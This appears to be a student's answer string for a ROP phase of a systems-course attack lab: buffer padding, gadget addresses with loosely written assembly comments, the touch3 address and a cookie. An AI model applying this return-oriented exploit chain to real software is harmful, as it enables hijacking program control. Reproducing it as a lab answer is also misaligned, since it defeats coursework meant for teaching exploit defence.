00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

02 1b 40 00 00 00 00 00 /*mov rsp, rax*/
a8 1a 40 00 00 00 00 00 /*mov rax, rdi*/
bb 1a 40 00 00 00 00 00 /*pop rax*/

48 00 00 00 00 00 00 00

43 1b 40 00 00 00 00 00 /*mov eax, ecx . . . no eax,edx*/
5e 1b 40 00 00 00 00 00 /*mov ecx, edx*/
3c 1b 40 00 00 00 00 00 /*mov edx, esi*/
cc 1a 40 00 00 00 00 00 /*lea (rdx, rsi), rax*/
a8 1a 40 00 00 00 00 00 /*rdx, rdi*/

f4 19 40 00 00 00 00 00 /*touch3*/
34 36 32 61 66 33 64 39 00 /*cookie*/